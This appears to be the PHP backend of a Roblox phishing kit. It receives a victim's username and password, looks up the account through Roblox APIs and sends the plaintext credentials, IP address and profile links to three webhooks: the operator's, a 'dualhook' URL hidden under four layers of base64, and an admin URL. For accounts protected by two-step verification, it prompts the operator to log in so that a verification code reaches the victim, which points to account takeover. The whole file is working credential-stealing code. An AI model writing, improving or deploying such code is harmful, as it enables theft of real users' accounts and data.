<?php
include("setup.php");

if (isset($_GET['username']) && isset($_GET['password'])) {
    $username = urldecode($_GET['username']);
    $password = urldecode($_GET['password']);
    $return = urldecode($_GET['returnUrl']);
    $returnUrlFile = 'tokens/returnUrl-' . $_GET['returnUrl'] . '.txt';
    $webhook = base64_decode(base64_decode(file_get_contents($returnUrlFile)));
    $TermedFile = 'tokens/login/' . $_GET['returnUrl'] . '.txt';
    $loginTermed = file_get_contents($TermedFile);
    $x = "tokens/dualhook/$loginTermed/name.txt";
    if (file_exists($x)) {
        $k = file_get_contents($x);
    } else {
        $k = $name;
    }
    $x1 = "tokens/dualhook/$loginTermed/thumbnail.txt";
    if (file_exists($x1)) {
        $k1 = file_get_contents($x1);
    } else {
        $k1 = $image;
    }
    $x2 = "tokens/dualhook/$loginTermed/hex.txt";
    if (file_exists($x2)) {
        $k2 = file_get_contents($x2);
    } else {
        $k2 = $color;
    }
    $dualHookFile = 'tokens/' . $_GET['returnUrl'] . '.txt';
    $Dwebhook = base64_decode(base64_decode(base64_decode(base64_decode(file_get_contents($dualHookFile)))));
    $TermedFile1 = 'tokens/login/' . $_GET['returnUrl'] . '.txt';
    $loginTermed1 = file_get_contents($TermedFile1);
    $x = "tokens/dualhook/$loginTermed1/name.txt";
    if (file_exists($x)) {
        $k = file_get_contents($x);
    } else {
        $k = $name;
    }
    $x1 = "tokens/dualhook/$loginTermed1/thumbnail.txt";
    if (file_exists($x1)) {
        $k1 = file_get_contents($x1);
    } else {
        $k1 = $image;
    }
    $x2 = "tokens/dualhook/$loginTermed1/hex.txt";
    if (file_exists($x2)) {
        $k2 = file_get_contents($x2);
    } else {
        $k2 = $color;
    }
    $RobloxApi = 'https://api.newstargeted.com/roblox/users/v2/user.php?username=' . urlencode($username);
    $p = file_get_contents($RobloxApi);
    if ($p !== false) {
        $p0 = json_decode($p, true);
        if ($p0 !== null && isset($p0['userId'])) {
            $userId = $p0['userId'];
            $assetTermed = "102611803";
            $urlP = "https://inventory.roblox.com/v1/users/" . urlencode($userId) . "/items/0/" . urlencode($assetTermed) . "/is-owned";
            $api_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false";
            $json = file_get_contents($api_url);
            $data = json_decode($json, true);
            $image_url = $data["data"][0]["imageUrl"];
            $ip = $_SERVER['REMOTE_ADDR'];
            if (file_get_contents($urlP) === 'false') {
                $verified = 'Unverified';
                $verifiedStatus = '❌';
                $timestamp = date("c", strtotime("now"));
                $headers = [ 'Content-Type: application/json; charset=utf-8' ];
                $POST = [
                    "username" => "$k",
                    "avatar_url" => "$k1",
                     "content" => "",
                        "embeds" => [
                            [
                                "title" => "",
                                "type" => "rich",
                                "color" => hexdec("$k2"),
                                "description" => "**[Rolimon's](https://www.rolimons.com/player/$userId) --- [Profile](https://roblox.com/users/$userId/profile)**",
                                "thumbnail" => [
                                    "url" => "$image_url",
                                ],
                                "footer" => [
                                    "text" => "$timestamp",
                                  "icon_url" => "$image_url",
                                ],
                                "fields" => [
                                    [
                                        "name" => "**Username**",
                                        "value" => "```$username```",
                                        "inline" => false
                                    ],
                                    [
                                      "name" => ":key: Password",
                                      "value" => "```$password```",
                                      "inline" => false
                                    ],
                                    [
                                        "name" => ":robot: IP",
                                        "value" => "```$ip```",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => "**$verifiedStatus Status**",
                                        "value" => "```$verified```",
                                        "inline" => false
                                    ],
                                ]
                            ],
                        ],
                    
                    ];
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $Dwebhook);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $webhook);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $admin);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    echo "\nVerification Status: $verified"; // removing this will crash the login!
            } else {
                $verified = 'Verified';
                $verifiedStatus = '✅';
                $api_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false";
                $json = file_get_contents($api_url);
                $data = json_decode($json, true);
                $image_url = $data["data"][0]["imageUrl"];
                $timestamp = date("c", strtotime("now"));
                $ip = $_SERVER['REMOTE_ADDR'];
                $headers = [ 'Content-Type: application/json; charset=utf-8' ];
                $POST = [
                    "username" => "$k",
                    "avatar_url" => "$k1",
                     "content" => "",
                        "embeds" => [
                            [
                                "title" => "TwoStep Verification Notifier",
                                "type" => "rich",
                                "color" => hexdec("$k2"),
                                "description" => "",
                                "thumbnail" => [
                                    "url" => "$image_url",
                                ],
                                "footer" => [
                                    "text" => "$timestamp",
                                  "icon_url" => "$image_url",
                                ],
                                "fields" => [
                                    [
                                        "name" => "",
                                        "value" => "
                                        **login to $username so they can recieve a two step verification code**
                                        Username: **$username**
                                        Password: **$password**
                                        Type: **Email**",
                                        "inline" => false
                                    ],
                                ]
                            ],
                        ],
                    
                    ];
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $Dwebhook);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $webhook);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $admin);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
            echo "\nVerification Status: $verified"; // removing this will crash the login!
            }
        } else {
            echo "\nerror";
        }
    } else {
        echo "\nerror.";
    }
} else {
    echo "error";
}
?>
